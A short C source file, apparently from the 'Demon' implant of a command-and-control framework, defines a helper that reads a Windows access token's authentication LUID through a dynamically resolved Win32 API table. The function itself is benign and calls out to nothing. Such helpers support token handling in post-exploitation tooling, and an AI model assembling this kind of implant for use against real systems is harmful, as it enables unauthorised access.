
#include <Demon.h>

LUID* GetLUID(HANDLE TokenHandle)
{
    TOKEN_STATISTICS tokenStats = { 0 };
    DWORD            tokenSize  = 0;
    LUID*            luid       = NULL;

    if ( ! TokenHandle )
        return NULL;

    if ( ! Instance.Win32.GetTokenInformation( TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize ) )
        return NULL;

    luid = Instance.Win32.LocalAlloc( LPTR, sizeof(LUID) );
    if ( ! luid )
        return NULL;

    luid->HighPart = tokenStats.AuthenticationId.HighPart;
    luid->LowPart  = tokenStats.AuthenticationId.LowPart;

    return luid;
}
